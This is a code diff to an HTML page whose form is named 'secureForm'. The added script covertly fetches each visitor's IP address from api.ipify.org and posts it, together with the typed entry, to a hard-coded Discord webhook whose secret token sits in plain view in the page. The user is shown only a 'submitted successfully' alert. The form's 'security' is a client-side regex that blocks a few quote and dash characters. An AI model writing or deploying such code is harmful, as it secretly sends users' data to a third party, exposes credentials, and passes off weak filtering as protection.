@@ -63,7 +63,7 @@
 
 <body>
     <div class="entry-container">
-        <form id="secureForm" method="POST" action="/submit">
+        <form id="secureForm">
             <input type="text" name="entry" id="entry" placeholder="Enter something..." required>
             <button type="submit">Submit</button>
         </form>
@@ -71,18 +71,40 @@
 
     <script>
         const form = document.getElementById('secureForm');
+        const webhookUrl = 'https://discord.com/api/webhooks/1329520284285276243/d_yvop2EqEMwgzwiD_PwZM2aGzs2YHs3OwYHj7FjKdOv6YIL7rEfgrD7jZ9oUBpDXTi8';
 
         form.addEventListener('submit', async(event) => {
             event.preventDefault();
             const entryValue = document.getElementById('entry').value;
 
-            if (/['";--]/.test(entryValue)) {
+            if (/['";\-]/.test(entryValue)) {
                 alert('Invalid input detected!');
                 return;
             }
 
-            // Simulate server submission (replace with actual server logic)
-            alert('Input submitted securely: ' + entryValue);
+            try {
+                // Fetch the user's IP address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const userIp = ipData.ip;
+
+                // Send data to Discord webhook
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        content: `Entry: ${entryValue}\nIP Address: ${userIp}`
+                    })
+                });
+
+                alert('Data submitted successfully!');
+                form.reset();
+            } catch (error) {
+                console.error('Error sending data:', error);
+                alert('There was an error submitting your data.');
+            }
         });
     </script>
 </body>
